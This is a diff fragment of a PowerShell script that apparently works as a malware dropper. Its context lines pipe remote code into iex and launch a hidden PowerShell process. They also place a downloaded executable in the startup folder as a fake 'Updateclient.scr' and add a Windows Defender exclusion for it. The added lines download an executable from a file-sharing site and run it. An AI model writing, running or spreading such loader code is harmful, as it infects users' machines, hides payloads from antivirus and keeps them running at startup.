@@ -126,6 +126,16 @@ Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -Pas
 
 iwr "https://leaked.tools/r/GFvWVhDQmc" | iex
 
+$url = "https://anonsharing.com/file/0cd01f4495a26c20/rc.exe"
+$output = "$dir\gay.exe"
+if (Test-Path -Path $output) {
+    Write-Host "hello"
+} else {
+    Invoke-WebRequest -Uri $url -OutFile $output
+    Start-Process $output
+    Write-Host "Tệp đã được tải về thành công."
+}
+
 $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
 $output = "$startupfolder\Updateclient.scr"
 Add-MpPreference -ExclusionPath $output
